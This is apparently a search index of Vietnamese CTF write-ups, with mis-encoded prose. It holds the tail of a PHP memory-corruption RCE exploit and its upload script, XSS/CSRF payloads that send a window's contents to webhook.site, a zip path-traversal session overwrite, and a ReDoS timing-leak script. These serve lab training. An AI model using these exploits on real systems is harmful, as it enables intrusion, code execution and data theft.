$this-&amp;gt;helper_addr + CHUNK_SIZE + 8); $this-&amp;gt;write($val_off + 8, 0xA); } private function prepare_cleanup($binary_leak) { $ret_gadget = $binary_leak; do { --$ret_gadget; } while($this-&amp;gt;read($ret_gadget, 1) !== 0xC3); $this-&amp;gt;log(&quot;ret gadget = 0x%x&quot;, $ret_gadget); $this-&amp;gt;write(0, $this-&amp;gt;abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60)); $this-&amp;gt;write(8, $ret_gadget); } private function read($addr, $n = 8) { $this-&amp;gt;write($this-&amp;gt;helper_off + CHUNK_SIZE + 16, $addr - 0x10); $value = strlen($this-&amp;gt;helper-&amp;gt;c); if($n !== 8) { $value &amp;amp;= (1 &amp;lt;&amp;lt; ($n &amp;lt;&amp;lt; 3)) - 1; } return $value; } private function write($p, $v, $n = 8) { for($i = 0; $i &amp;lt; $n; $i++) { $this-&amp;gt;abc[$p + $i] = chr($v &amp;amp; 0xff); $v &amp;gt;&amp;gt;= 8; } } private function get_basic_funcs($addr) { while(true) { $addr -= 0x10; if($this-&amp;gt;read($addr, 4) === 0xA8 &amp;amp;&amp;amp; in_array($this-&amp;gt;read($addr + 4, 4), [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) { $module_name_addr = $this-&amp;gt;read($addr + 0x20); $module_name = $this-&amp;gt;read($module_name_addr); if($module_name === 0x647261646e617473) { $this-&amp;gt;log(&quot;standard module @ 0x%x&quot;, $addr); return $this-&amp;gt;read($addr + 0x28); } } } } private function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = $this-&amp;gt;read($addr); $f_name = $this-&amp;gt;read($f_entry, 6); if($f_name === 0x6d6574737973) { return $this-&amp;gt;read($addr + 8); } $addr += 0x20; } while($f_entry !== 0); } private function cleanup() { $this-&amp;gt;hfp = fopen(&#39;php://memory&#39;, &#39;w&#39;); fwrite($this-&amp;gt;hfp, pack(&#39;QQ&#39;, 0, $this-&amp;gt;abc_addr)); for($i = 0; $i &amp;lt; FILTER_SIZE - 0x10; $i++) { fwrite($this-&amp;gt;hfp, &quot;\\x00&quot;); } } private function str2ptr($p = 0, $n = 8) { $address = 0; for($j = $n - 1; $j &amp;gt;= 0; $j--) { $address &amp;lt;&amp;lt;= 8; $address |= ord($this-&amp;gt;abc[$p + $j]); } return $address; } private function ptr2str($ptr, $n = 8) { $out = &#39;&#39;; for ($i = 0; $i &amp;lt; $n; $i++) { $out .= chr($ptr &amp;amp; 0xff); $ptr &amp;gt;&amp;gt;= 8; } return $out; } private function log($format, $val = &#39;&#39;) { if(LOGGING) { printf(&quot;{$format}\\n&quot;, $val); } } static function alloc($size) { return str_shuffle(str_repeat(&#39;A&#39;, $size)); }}?&amp;gt;&quot;&quot;&quot;) r = requests.post(TARGET, files={&#39;data&#39;: (&#39;payload.php&#39;, open(&#39;payload.php&#39;, &#39;rb&#39;))}, data={&#39;data&#39;: &#39;test&#39;}, headers={&#39;Cookie&#39;: &#39;PHPSESSID=7b4bd8d9ff68e20dc0317595b6623ef6&#39;}) # print(r.text) match = re.search(&#39;You have logged in as user (.*)&#39;, r.text) extract_data = base64.b64decode(match[1]).decode() index = extract_data.find(&#39;&amp;lt;/creds&amp;gt;&#39;) + len(&#39;&amp;lt;/creds&amp;gt;&#39;) rce_data = extract_data[index:] print(rce_data)K·∫øt qu·∫£:RCE sucess spbctf{XX3_2_rCe_w3Ll_D0n3}Tham kh·∫£o https://blog.sonarsource.com/wordpress-xxe-security-vulnerability https://ctf.zeyu2001.com/2021/spbctfs-student-ctf-quals/31-line-php https://php.watch/versions/8.0/libxml_disable_entity_loader-deprecation" }, { "title": "Noted - picoCTF2022", "url": "/posts/noted/", "categories": "WebSec, CTF", "tags": "csrf, xss", "date": "2022-04-04 22:08:00 +0700", "snippet": "S∆° l∆∞·ª£c v·ªÅ challengeTrang g·ªìm c√≥ hai ch·ª©c nƒÉng Login v√† Registeroverview1Ti·∫øp ƒë√≥ ta th·ªÉ t·∫°o note v√† g·ª≠i link ƒë·ªÉ report.overview2Ph√¢n t√≠chSau khi th·ª≠ th√¨ m√¨nh nh·∫≠n th·∫•y c√≥ l·ªói xss ·ªü ƒë√¢yClick to play videoSuy ra b√†i n√†y l√† m·ªôt d·∫°ng Self Store XSSC≈©ng t∆∞∆°ng t·ª± nh∆∞ c√°c b√†i xss kh√°c, ch·ª©c nƒÉng report s·∫Ω l√†m con bot (ƒë√≥ng vai tr√≤ nh∆∞ admin) access ƒë·∫øn link m√† ta g·ª≠i.report.jsBot s·∫Ω t·∫°o m·ªôt t√†i kho·∫£n v·ªõi tk, mk random v√† t·∫°o m·ªôt note v·ªõi content ch√≠nh l√† flag. Sau ƒë√≥ s·∫Ω access t·ªõi url ƒë∆∞·ª£c report.Trong web.js c√≥ th·ªÉ th·∫•y server d√πng csrf token trong c√°c route.web.jsKhai th√°cB·ªüi v√¨ sau khi v·ª´a t·∫°o note th√¨ phi√™n ho·∫°t ƒë·ªông c·ªßa bot v·∫´n c√≤n hi·ªáu l·ª±c n√™n t·ª´ ƒë√≥ ta s·∫Ω nghƒ© c√°ch ƒë·ªÉ c√≥ th·ªÉ l·∫•y n·ªôi dung t·ª´ trang /notes c·ªßa con bot (ch·ª©a flag) v√† g·ª≠i ƒë·∫øn webhook ho·∫∑c c√≥ th·ªÉ t·∫°o m·ªôt note m·ªõi v·ªõi content l√† flag ·ªü account c·ªßa ta.B·ªüi v√¨ sau khi v·ª´a t·∫°o note th√¨ session c·ªßa bot v·∫´n c√≤n l∆∞u tr√™n tr√¨nh duy·ªát n√™n t·ª´ ƒë√≥ ta s·∫Ω nghƒ© c√°ch ƒë·ªÉ c√≥ th·ªÉ l·∫•y n·ªôi dung t·ª´ trang /notes c·ªßa con bot (ch·ª©a flag) v√† g·ª≠i ƒë·∫øn webbook ho·∫∑c c√≥ th·ªÉ t·∫°o m·ªôt note m·ªõi v·ªõi content l√† flag ·ªü account c·ªßa ta.G·ª≠i ƒë·∫øn webhookC√°ch n√†y kh√¥ng ƒë√≤i h·ªèi ph·∫£i extract csrf tokenflow1ƒê·∫ßu ti√™n ta kh·ªüi t·∫°o 1 account v·ªõi tk,mk: bla m·ª•c ƒë√≠ch l√† l∆∞u xss script c√≥ vai tr√≤ g·ª≠i n·ªôi dung c·ªßa window ch·ª©a flag t·ªõi webhook c·ªßa ta.XSS note s·∫Ω c√≥ n·ªôi dung nh∆∞ sau:&amp;lt;script&amp;gt; if (window.location.search.includes(&#39;pwn&#39;)) window.location = &#39;https://webhook.site/&amp;lt;id&amp;gt;?&#39; + window.open(&#39;&#39;, &#39;flag&#39;).document.body.textContent&amp;lt;/script&amp;gt;·ªû ƒë√¢y ta d√πng window.location.search.includes l√† ƒë·ªÉ tr√°nh vi·ªác b·ªã redirect li√™n t·ª•c t·ªõi webhook.Ti·∫øp theo ·ªü exploit server ta t·∫°o m·ªôt index.html v·ªõi layoutflow2Csrf form s·∫Ω l√†: &amp;lt;form action=&#39;http://0.0.0.0:8080/login&#39; method=&#39;POST&#39; id=&#39;csrf&#39; target=&#39;_blank&#39;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;bla&quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;password&quot; value=&quot;bla&quot;&amp;gt; &amp;lt;/form&amp;gt;Script ƒë·ªÉ exploit s·∫Ω l√†: &amp;lt;script&amp;gt; window.open(&#39;http://0.0.0.0:8080/notes&#39;, &#39;flag&#39;); setTimeout(`csrf.submit()`, 1000); setTimeout(`window.location=&#39;http://0.0.0.0:8080/notes?pwn&#39;`, 1500); &amp;lt;/script&amp;gt;Trong csrf form ta th√™m thu·ªôc t√≠nh target v√† g√°n gi√° tr·ªã b·∫±ng _blank ƒë·ªÉ reponse tr·∫£ v·ªÅ t·ª´ action s·∫Ω m·ªü ·ªü tab m·ªõi n·∫øu kh√¥ng c√°c d√≤ng javascript ·ªü b√™n d∆∞·ªõi s·∫Ω kh√¥ng ƒë∆∞·ª£c th·ª±c thi.ƒê·ªÉ hi·ªÉu r√µ h∆°n v·ªÅ c√°ch khai th√°c n√†y ta s·∫Ω ƒë·∫∑t t·∫•t c·∫£ l·∫°i v·ªõi nhau: ƒê·∫ßu ti√™n g·ª≠i cho con bot link exploit server, bot s·∫Ω truy c·∫≠p t·ªõi exploit server hay c·ª• th·ªÉ l√† index.html ƒêo·∫°n script ·ªü index.html s·∫Ω open new tab v·ªõi t√™n l√† flag (s·∫Ω kh√¥ng y√™u c·∫ßu nh·∫≠p username, password b·ªüi v√¨ phi√™n ho·∫°t ƒë·ªông c·ªßa bot v·∫´n c√≤n v√† c·ª≠a s·ªï n√†y s·∫Ω ch·ª©a note v·ªõi content l√† flag) Sau 1s th√¨ submit csrf form l√∫c n√†y bot s·∫Ω login v√†o account ta v·ª´a t·∫°o v√† k·∫øt qu·∫£ hi·ªÉn th·ªã ·ªü new blank tab Sau 1,5s th√¨ chuy·ªÉn h∆∞·ªõng t·ª´ exploit page ƒë·∫øn http://0.0.0.0:8080/notes?pwn l∆∞u √Ω r·∫±ng ·ªü ƒëo·∫°n code tr∆∞·ªõc ta ƒë√£ ƒëƒÉng nh·∫≠p v√†o t√†i kho·∫£n bla n√™n b√¢y gi·ªù c≈©ng s·∫Ω chuy·ªÉn h∆∞·ªõng t·ªõi /notes c·ªßa bla. ?pwn d√πng ƒë·ªÉ trigger store xss v√† g·ª≠i n·ªôi dung c·ª≠a s·ªï flag ƒë·∫øn webhook.C√≥ th·ªÉ th·∫•y l√∫c n√†y ta kh√¥ng h·ªÅ vi ph·∫°m same origin policy khi l·∫•y document.body.textContent t·ª´ c·ª≠a s·ªï flag b·ªüi v√¨ ch√∫ng ƒë·ªÅu thu·ªôc c√πng domain, port v√† scheme.V√† k·∫øt qu·∫£:resultExtract csrf token·ªû c√°ch n√†y th√¨ form csrf v·∫´n nh∆∞ c√°ch kia nh∆∞ng c√≥ s·ª± thay ƒë·ªïi v·ªÅ xss note v√† script exploitScript exploit: &amp;lt;script&amp;gt; window.open(&#39;http://0.0.0.0:8080/notes&#39;, &#39;flag&#39;) setTimeout(`csrf.submit()`, 1000); &amp;lt;/script&amp;gt;XSS note:&amp;lt;script&amp;gt;fetch(&quot;/new&quot;).then(r =&amp;gt; r.text()).then(r =&amp;gt; { //extract csrf token t·ª´ &#39;/new&#39; let csrf = r.match(/_csrf&quot; value=&quot;([^&quot;]*)/)[1]; //l·∫•y flag let flag = window.open(&#39;&#39;, &#39;flag&#39;).document.querySelector(&quot;body&amp;gt;div&amp;gt;p&quot;).innerHTML; //t·∫°o note v·ªõi content l√† flag ·ªü account c·ªßa ta fetch(&quot;/new&quot;, { method: &quot;POST&quot;, body: JSON.stringify({ _csrf: csrf, title: &quot;PWNED!!!&quot;, content: flag }), headers: { &#39;Content-Type&#39;: &#39;application/json&#39; } });});&amp;lt;/script&amp;gt;K·∫øt qu·∫£:resultTham kh·∫£ohttps://docs.abbasmj.com/ctf-writeups/picoctf-2022#noted" }, { "title": "Slipping beauty - webhacking.kr", "url": "/posts/slippingBeauty/", "categories": "WebSec, CTF", "tags": "path traversal", "date": "2022-04-04 12:58:00 +0700", "snippet": "Link challengehttp://webhacking.kr:10015/Source codesource codePh√¢n t√≠chV√¨ t√™n chall l√† ‚Äúslipping beauty‚Äù n√™n m√¨nh th·ª≠ d√πng file upload symlink zip nh∆∞ng kh√¥ng th√†nh c√¥ng v√¨ zip wrapper s·∫Ω kh√¥ng ƒë·ªçc ƒë∆∞·ª£c symlink zip n√™n m√¨nh s·∫Ω ti·∫øp c·∫≠n theo h∆∞·ªõng kh√°c.T·ª´ wu n√†y ta th·∫•y ƒë∆∞·ª£c 1 th·ª© th√∫ v·ªã :By default, PHP stores its sessions in a serialized format in the directory /var/lib/php/sessions, in a file named sess_[session ID]V·∫≠y n·∫øu ta l·ª£i d·ª•ng h√†m copy ƒë·ªÉ copy n·ªôi d·ª•ng file upload exploit.zip v·ªõi t√™n file ƒëc zip l√† ../../../../var/lib/php/session/sess_myphpsseid nh·∫±m m·ª•c ƒë√≠ch ghi file ·ªü b√™n ph√≠a server th√¨ sao?ƒê·ªÉ l√†m ƒë∆∞·ª£c ƒëi·ªÅu ƒë√≥ th√¨ ta c·∫ßn t√¨m 1 tool ƒë·ªÉ c√≥ th·ªÉ zip file ch·ª©a c√°c chacracter ƒë·∫∑c bi·ªát nh∆∞ / hay .Sau 1 h·ªìi search m√¨nh t√¨m ƒë∆∞·ª£c m·ªôt tool tr√™n githubTi·∫øp theo ta xem c√°ch PHP l∆∞u session:php session fileOk th·∫ø file session t c·∫ßn t·∫°o s·∫Ω c√≥ n·ªôi dung l√† uid|s :5 : &quot;admin&quot;ƒê·ªÉ √Ω r·∫±ng file name s·∫Ω b·ªã th√™m 1 v√†o 1 s·ªë random n√™n vi·ªác ta c·∫ßn l√†m l√† t·∫°o 1 file v·ªõi t√™n l√† sess_ v√† n·ªôi dung nh∆∞ tr√™n, sau khi nh·∫≠n ƒë∆∞·ª£c s·ªë random ƒë√≥ th√¨ paste v√†o cookie ƒë·ªÉ solve chall n√†y üòäKhai th√°cScript ƒë·ªÉ t·∫°o file upload:exploit stepV√† upload:upload reponseCu·ªëi c√πng ta set trong cookie: PHPSESSID=24094577 v√† load l·∫°i trang ƒë·ªÉ server d√πng session n√†y.result FLAG{my_zip_is_slipping_beauty}" }, { "title": "Regex Master - webhacking.kr", "url": "/posts/blindRegexInjection/", "categories": "WebSec, CTF", "tags": "timing attack", "date": "2022-04-02 02:39:00 +0700", "snippet": "Link challengehttp://regexmaster.webhacking.krSource codesource codePh√¢n t√≠ch·ªû b√†i n√†y source code r·∫•t ƒë∆°n gi·∫£n, ch·ªâ ki·ªÉm tra xem bi·∫øn flag c√≥ ch·ª©a chu·ªói parttern (nh·∫≠n t·ª´ GET request) hay kh√¥ng m√† kh√¥ng h·ªÅ xu·∫•t ra k·∫øt qu·∫£ hay output n√†o kh√°c.Sau m·ªôt h·ªìi suy nghƒ© th√¨ m√¨nh quy·∫øt ƒë·ªãnh th·ª≠ khai th√°c b·∫±ng blind regex injection + timing attackƒê·ªÉ hi·ªÉu chi ti·∫øt h∆°n v·ªÅ kƒ© thu·∫≠t n√†y c√°c b·∫°n c√≥ th·ªÉ xem t·∫°i ƒë√¢y.Khai th√°cimport requestsimport sysimport timeimport randomimport stringimport re# constantsTHRESHOLD = 1url = &#39;http://regexmaster.webhacking.kr/?pattern=&#39;# predicatesdef length_is(n): return &quot;.{&quot; + str(n) + &quot;}$&quot;def nth_char_is(n, c): if c == &#39;/&#39;: return &quot;.{&quot; + str(n-1) + &quot;}&quot; + &#39;\\/&#39; + &quot;.*$&quot; if c == &#39;\\\\&#39;: return &quot;.{&quot; + str(n-1) + &quot;}&quot; + &#39;\\\\\\\\&#39; + &quot;.*$&quot; return &quot;.{&quot; + str(n-1) + &quot;}&quot; + re.escape(c) + &quot;.*$&quot;# utilitiesdef redos_if(regexp, salt): return &quot;^(?={})(((((.*)*)*)*)*)*{}&quot;.format(regexp, salt)def get_request_duration(payload): # print(payload) try: r = requests.get(url+payload) duration = r.elapsed.total_seconds() except: duration = -1 exit(1) # print(duration) return durationdef prop_holds(prop, salt): return get_request_duration(redos_if(prop, salt)) &amp;gt; THRESHOLDdef generate_salt(): return &#39;&#39;.join([random.choice(string.ascii_letters) for i in range(10)])# exploitif __name__ == &#39;__main__&#39;: # generating salt salt = generate_salt() while not prop_holds(&#39;.*&#39;, salt): salt = generate_salt() print(&quot;[+] salt: {}&quot;.format(salt)) # leak length upper_bound = 100 secret_length = 0 for i in range(0, upper_bound): if prop_holds(length_is(i), salt): secret_length = i break print(&quot;[+] length: {}&quot;.format(secret_length)) flag = &quot;FLAG{&quot; for i in range(5, secret_length): stop = 0 for c in range(32, 128): if prop_holds(nth_char_is(i+1, chr(c)), salt): flag += chr(c) print(&quot;[*] {}&quot;.format(flag)) stop = 1 break print(&quot;[+] Flag: {}&quot;.format(flag)) FLAG{im_r/e/g/e/x_master//_//}Tham kh·∫£ohttps://diary.shift-js.info/blind-regular-expression-injection" } ]
